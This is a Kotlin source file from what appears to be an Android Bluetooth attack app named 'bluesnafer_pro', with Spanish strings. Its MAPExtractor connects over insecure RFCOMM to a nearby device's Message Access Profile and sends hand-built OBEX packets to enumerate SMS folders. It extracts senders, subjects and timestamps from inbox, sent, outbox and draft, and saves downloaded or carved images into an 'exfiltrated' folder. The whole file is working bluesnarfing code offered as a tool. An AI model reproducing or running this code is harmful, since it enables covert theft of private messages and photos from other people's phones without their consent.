package com.bluesnafer_pro

import android.bluetooth.*
import java.io.*
import java.util.*

/**
 * MAP (Message Access Profile) — extracción vía OBEX sobre RFCOMM.
 * UUID MAS: 00001133-0000-1000-8000-00805F9B34FB
 */
object MAPExtractor {
    private const val TAG = "MAPExtractor"

    private val MAP_UUID = UUID.fromString("00001133-0000-1000-8000-00805F9B34FB")

    private val MAP_FOLDERS = listOf(
        "telecom/msg/inbox",
        "telecom/msg/sent",
        "telecom/msg/outbox",
        "telecom/msg/draft"
    )

    fun extractMessages(device: BluetoothDevice, maxMessages: Int = 50): Map<String, Any> {
        BluesnaferLogger.d(TAG, "MAP RFCOMM extraction on ${device.address}")
        val messages = mutableListOf<Map<String, String>>()

        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(MAP_UUID)
            socket.connect()

            val input = socket.inputStream
            val output = socket.outputStream

            val (code, maxPacket) = obexConnect(input, output)
            if (code != 0xA0) {
                socket.close()
                return mapOf(
                    "success" to false,
                    "error" to "MAP OBEX connect rejected: 0x${code.toString(16)}",
                    "cve" to "MAP-EXTRACT",
                    "transport" to "RFCOMM_MAP"
                )
            }

            for (folder in MAP_FOLDERS) {
                if (messages.size >= maxMessages) break
                if (!obexSetPath(input, output, folder)) continue

                val listing = obexGetMessageListing(input, output, maxPacket)
                val parsed = parseMessageListing(listing)
                for (msg in parsed) {
                    if (messages.size >= maxMessages) break
                    messages.add(msg + ("folder" to folder))
                }
            }

            socket.close()

            mapOf(
                "success" to messages.isNotEmpty(),
                "message" to if (messages.isNotEmpty()) "MAP extraction completed" else "No MAP messages found",
                "messages" to messages,
                "count" to messages.size,
                "sample" to messages.take(3).map { "From: ${it["sender"]}, Body: ${it["body"]?.take(50)}" },
                "cve" to "MAP-EXTRACT",
                "severity" to "MEDIUM",
                "profile" to "MAP",
                "transport" to "RFCOMM_MAP"
            )
        } catch (e: Exception) {
            BluesnaferLogger.e(TAG, "MAP extraction error: ${e.message}")
            mapOf(
                "success" to false,
                "error" to (e.message ?: "unknown error"),
                "cve" to "MAP-EXTRACT",
                "transport" to "RFCOMM_MAP"
            )
        }
    }

    fun listFolders(device: BluetoothDevice): Map<String, Any> {
        BluesnaferLogger.d(TAG, "MAP folder enumeration via RFCOMM")

        return try {
            val socket = device.createInsecureRfcommSocketToServiceRecord(MAP_UUID)
            socket.connect()

            val input = socket.inputStream
            val output = socket.outputStream
            val (code, maxPacket) = obexConnect(input, output)
            if (code != 0xA0) {
                socket.close()
                return mapOf("success" to false, "error" to "MAP connect failed", "cve" to "MAP-ENUM")
            }

            val folders = mutableListOf<String>()
            for (folder in MAP_FOLDERS) {
                if (obexSetPath(input, output, folder)) {
                    folders.add(folder)
                }
            }

            if (folders.isEmpty()) {
                val listing = obexGetFolderListing(input, output, maxPacket)
                folders.addAll(parseFolderNames(listing))
            }

            socket.close()

            mapOf(
                "success" to folders.isNotEmpty(),
                "folders" to folders,
                "count" to folders.size,
                "cve" to "MAP-ENUM",
                "transport" to "RFCOMM_MAP"
            )
        } catch (e: Exception) {
            mapOf("success" to false, "error" to (e.message ?: "unknown error"), "cve" to "MAP-ENUM")
        }
    }

    private fun obexConnect(input: InputStream, output: OutputStream): Pair<Int, Int> {
        val connect = byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x40, 0x00)
        output.write(connect)
        output.flush()

        val resp = ByteArray(7)
        val read = readAll(input, resp, 7, 5000)
        if (read < 3) return Pair(-1, 4096)

        val responseCode = resp[0].toInt() and 0xFF
        val maxPacket = if (resp.size > 6) {
            ((resp[5].toInt() and 0xFF) shl 8) or (resp[6].toInt() and 0xFF)
        } else 4096
        return Pair(responseCode, maxPacket.coerceAtMost(16384))
    }

    private fun obexSetPath(input: InputStream, output: OutputStream, path: String): Boolean {
        val cleanPath = path.trim('/')
        if (cleanPath.isEmpty()) return true

        for (dir in cleanPath.split('/')) {
            val nameBytes = dir.toByteArray(Charsets.UTF_8)
            val pktLen = 5 + nameBytes.size
            val pkt = ByteArray(pktLen)
            pkt[0] = 0xC6.toByte()
            pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
            pkt[2] = (pktLen and 0xFF).toByte()
            pkt[3] = 0x00
            pkt[4] = 0x00
            System.arraycopy(nameBytes, 0, pkt, 5, nameBytes.size)

            output.write(pkt)
            output.flush()
            Thread.sleep(80)

            val resp = ByteArray(3)
            readAll(input, resp, 3, 3000)
            val code = resp[0].toInt() and 0xFF
            if (code != 0xA0 && code != 0x90) return false
        }
        return true
    }

    private fun obexGetMessageListing(input: InputStream, output: OutputStream, maxPacket: Int): String {
        val typeHeader = "x-bt/MAP-msg-listing"
        val typeBytes = typeHeader.toByteArray(Charsets.UTF_8)
        val pktLen = 7 + typeBytes.size
        val pkt = ByteArray(pktLen)
        pkt[0] = 0x83.toByte()
        pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
        pkt[2] = (pktLen and 0xFF).toByte()
        pkt[3] = 0x42.toByte()
        pkt[4] = (((typeBytes.size + 3) shr 8) and 0xFF).toByte()
        pkt[5] = ((typeBytes.size + 3) and 0xFF).toByte()
        pkt[6] = 0x00
        System.arraycopy(typeBytes, 0, pkt, 7, typeBytes.size)

        output.write(pkt)
        output.flush()
        Thread.sleep(300)

        val resp = ByteArray(maxPacket)
        val read = readAll(input, resp, resp.size, 5000)
        if (read <= 3) return ""
        return String(resp, 3, read - 3, Charsets.UTF_8)
    }

    private fun obexGetFolderListing(input: InputStream, output: OutputStream, maxPacket: Int): String {
        val typeHeader = "x-obex/folder-listing"
        val typeBytes = typeHeader.toByteArray(Charsets.UTF_8)
        val pktLen = 7 + typeBytes.size
        val pkt = ByteArray(pktLen)
        pkt[0] = 0x83.toByte()
        pkt[1] = ((pktLen shr 8) and 0xFF).toByte()
        pkt[2] = (pktLen and 0xFF).toByte()
        pkt[3] = 0x42.toByte()
        pkt[4] = (((typeBytes.size + 3) shr 8) and 0xFF).toByte()
        pkt[5] = ((typeBytes.size + 3) and 0xFF).toByte()
        pkt[6] = 0x00
        System.arraycopy(typeBytes, 0, pkt, 7, typeBytes.size)

        output.write(pkt)
        output.flush()
        Thread.sleep(300)

        val resp = ByteArray(maxPacket)
        val read = readAll(input, resp, resp.size, 5000)
        if (read <= 3) return ""
        return String(resp, 3, read - 3, Charsets.UTF_8)
    }

    private fun parseMessageListing(body: String): List<Map<String, String>> {
        if (body.isBlank()) return emptyList()

        val messages = mutableListOf<Map<String, String>>()

        // MAP XML listing: <msg handle="..." subject="..." datetime="..." sender_name="..." />
        val msgTag = """<msg[^>]*>""".toRegex(RegexOption.IGNORE_CASE)
        for (match in msgTag.findAll(body)) {
            val tag = match.value
            val sender = extractAttr(tag, "sender_name")
                ?: extractAttr(tag, "sender_address")
                ?: extractPhone(body)
            val subject = extractAttr(tag, "subject") ?: ""
            val datetime = extractAttr(tag, "datetime") ?: System.currentTimeMillis().toString()
            val handle = extractAttr(tag, "handle") ?: ""

            if (sender != null || subject.isNotEmpty()) {
                messages.add(
                    mapOf(
                        "sender" to (sender ?: "unknown"),
                        "body" to subject,
                        "timestamp" to datetime,
                        "handle" to handle
                    )
                )
            }
        }

        if (messages.isEmpty()) {
            // Fallback: parse bMessage / plain text segments
            val segments = body.split("\u0000", "\n").filter { it.length > 8 }
            for (segment in segments.take(20)) {
                val phoneMatch = Regex("""\+?\d{5,}""").find(segment)
                val phone = phoneMatch?.value ?: "unknown"
                val text = segment.replace(phone, "").trim().take(200)
                if (text.isNotEmpty()) {
                    messages.add(
                        mapOf(
                            "sender" to phone,
                            "body" to text,
                            "timestamp" to System.currentTimeMillis().toString()
                        )
                    )
                }
            }
        }

        return messages
    }

    private fun parseFolderNames(body: String): List<String> {
        val folders = mutableListOf<String>()
        val known = listOf("inbox", "sent", "outbox", "draft", "deleted", "telecom", "msg")
        for (folder in known) {
            if (body.contains(folder, ignoreCase = true)) folders.add(folder)
        }
        val namePattern = """name\s*=\s*"([^"]+)""".toRegex()
        for (match in namePattern.findAll(body)) {
            val name = match.groupValues[1].trim()
            if (name.isNotEmpty() && name != "." && name != "..") folders.add(name)
        }
        return folders.distinct()
    }

    private fun extractAttr(tag: String, attr: String): String? {
        val pattern = """$attr\s*=\s*"([^"]*)"""".toRegex(RegexOption.IGNORE_CASE)
        return pattern.find(tag)?.groupValues?.getOrNull(1)?.trim()?.takeIf { it.isNotEmpty() }
    }

    private fun extractPhone(text: String): String? =
        Regex("""\+?\d{5,}""").find(text)?.value

    private fun readAll(input: InputStream, buffer: ByteArray, maxLen: Int, timeoutMs: Int): Int {
        var total = 0
        val deadline = System.currentTimeMillis() + timeoutMs
        while (total < maxLen && System.currentTimeMillis() < deadline) {
            val read = try { input.read(buffer, total, maxLen - total) } catch (_: Exception) { -1 }
            if (read < 0) break
            total += read
        }
        return total
    }

    /**
     * Extract image attachments from MAP messages.
     * Scans messages for attachment references and downloads image files.
     */
    fun extractImageAttachments(device: BluetoothDevice, maxMessages: Int = 50, maxImages: Int = 20): Map<String, Any> {
        BluesnaferLogger.d(TAG, "MAP image extraction on ${device.address}")
        val messages = extractMessages(device, maxMessages)["messages"] as? List<Map<String, String>> ?: emptyList()
        val extractedImages = mutableListOf<Map<String, Any>>()

        for (msg in messages) {
            if (extractedImages.size >= maxImages) break
            val body = msg["body"] ?: continue
            if (body.length < 10) continue

            // Look for image attachment references in message body
            val imageRefs = Regex("""(https?://[^\s]+\.(jpg|jpeg|png|gif|webp|heic|bmp))""", RegexOption.IGNORE_CASE)
                .findAll(body)
                .map { it.value }
                .toList()

            for (ref in imageRefs) {
                if (extractedImages.size >= maxImages) break
                try {
                    val ctx = BluetoothMethodHandler.getAppContext()
                    if (ctx == null) continue
                    val dir = File(File(ctx.filesDir, "exfiltrated"), "map_images")
                    dir.mkdirs()
                    val safeName = "map_${System.currentTimeMillis()}_${extractedImages.size}.jpg"
                    val outFile = File(dir, safeName)

                    // Attempt to download the image from the reference URL
                    val downloaded = tryDownloadImage(ref, outFile)
                    if (downloaded) {
                        extractedImages.add(
                            mapOf(
                                "name" to safeName,
                                "size" to outFile.length(),
                                "localPath" to outFile.absolutePath,
                                "remotePath" to ref,
                                "mimeType" to "image/jpeg",
                                "messageSender" to (msg["sender"] ?: "unknown"),
                                "method" to "map_image_extract"
                            )
                        )
                    }
                } catch (_: Exception) {}
            }
        }

        // Also try to extract inline image data from message bodies (base64 or raw)
        for (msg in messages) {
            if (extractedImages.size >= maxImages) break
            val body = msg["body"] ?: continue
            if (body.length < 100) continue

            // Try to find JPEG/PNG magic bytes embedded in message body
            val bodyBytes = body.toByteArray(Charsets.UTF_8)
            val jpegIdx = indexOfMagic(bodyBytes, byteArrayOf(0xFF.toByte(), 0xD8.toByte()))
            if (jpegIdx >= 0 && extractedImages.size < maxImages) {
                try {
                    val ctx = BluetoothMethodHandler.getAppContext()
                    if (ctx == null) continue
                    val dir = File(File(ctx.filesDir, "exfiltrated"), "map_images")
                    dir.mkdirs()
                    val safeName = "map_inline_${System.currentTimeMillis()}_${extractedImages.size}.jpg"
                    val outFile = File(dir, safeName)
                    // Extract from magic bytes to end or next known boundary
                    val chunk = bodyBytes.copyOfRange(jpegIdx, minOf(jpegIdx + 5_000_000, bodyBytes.size))
                    outFile.writeBytes(chunk)
                    extractedImages.add(
                        mapOf(
                            "name" to safeName,
                            "size" to chunk.size.toLong(),
                            "localPath" to outFile.absolutePath,
                            "remotePath" to "map_inline://${msg["sender"] ?: "unknown"}",
                            "mimeType" to "image/jpeg",
                            "messageSender" to (msg["sender"] ?: "unknown"),
                            "method" to "map_image_extract"
                        )
                    )
                } catch (_: Exception) {}
            }
        }

        return mapOf(
            "success" to extractedImages.isNotEmpty(),
            "images" to extractedImages,
            "imagesCount" to extractedImages.size,
            "totalBytes" to extractedImages.fold(0L) { acc, img -> acc + ((img["size"] as? Long ?: 0)) },
            "method" to "map_image_extract",
            "message" to if (extractedImages.isNotEmpty()) "MAP image extract: ${extractedImages.size} im�genes encontradas" else "MAP: no se encontraron im�genes adjuntas"
        )
    }

    private fun tryDownloadImage(url: String, outFile: File): Boolean {
        return try {
            val javaUrl = java.net.URL(url)
            val connection = javaUrl.openConnection() as java.net.HttpURLConnection
            connection.connectTimeout = 5000
            connection.readTimeout = 10000
            connection.doInput = true
            connection.connect()
            if (connection.responseCode == 200) {
                val input = connection.inputStream
                val buffer = ByteArray(8192)
                val output = FileOutputStream(outFile)
                var read: Int
                while (input.read(buffer).also { read = it } != -1) {
                    output.write(buffer, 0, read)
                }
                output.close()
                input.close()
                outFile.exists() && outFile.length() > 0
            } else false
        } catch (_: Exception) { false }
    }

    private fun indexOfMagic(data: ByteArray, magic: ByteArray): Int {
        if (data.size < magic.size) return -1
        for (i in 0..data.size - magic.size) {
            if (data.copyOfRange(i, i + magic.size).contentEquals(magic)) return i
        }
        return -1
    }
}